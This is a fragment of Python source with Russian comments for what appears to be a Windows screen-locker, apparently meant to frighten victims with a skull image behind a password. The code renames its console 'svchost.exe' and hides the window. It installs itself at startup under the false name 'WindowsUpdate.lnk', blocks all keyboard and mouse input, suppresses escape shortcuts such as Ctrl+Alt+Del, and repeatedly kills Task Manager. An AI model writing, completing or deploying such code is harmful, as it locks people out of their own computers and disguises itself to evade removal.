PASSWORD = "1601"
TIMER_SECONDS = 10   # 10 секунд для теста
# ВСТАВЬ СВОЮ BASE64 СТРОКУ СЮДА (только код после "base64,")
SKULL_BASE64 = "data:image/jpeg;base64,"
# ============================================================

def hide_process():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    try:
        import win32api
        win32api.SetConsoleTitle("svchost.exe")
    except:
        pass

def add_to_startup():
    try:
        current_path = os.path.abspath(__file__)
        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
        if not current_path.endswith(".pyw"):
            try:
                shutil.copy2(current_path, pyw_path)
            except:
                pass
            current_path = pyw_path
        startup_folder = winshell.startup()
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        shortcut.Arguments = '"' + current_path + '"'
        shortcut.WorkingDirectory = os.path.dirname(current_path)
        shortcut.save()
    except:
        pass

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

def block_all_keys():
    try:
        import keyboard
        for combo in ['alt+f4','alt+tab','ctrl+shift+esc',
                      'ctrl+alt+del','win+d','win+r','win',
                      'alt','ctrl','shift','escape']:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
    except:
        pass

def kill_taskmgr():
    while True:
        try:
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        except:
            pass
        time.sleep(0.1)

def get_image_from_base64(base64_string):
    try:
        img_data = base64.b64decode(base64_string)
        img_path = os.path.join(tempfile.gettempdir(), "skull.png")
        with open(img_path, "wb") as f:
            f.write(img_data)
        return PhotoImage(file=img_path)
    except:
        return None

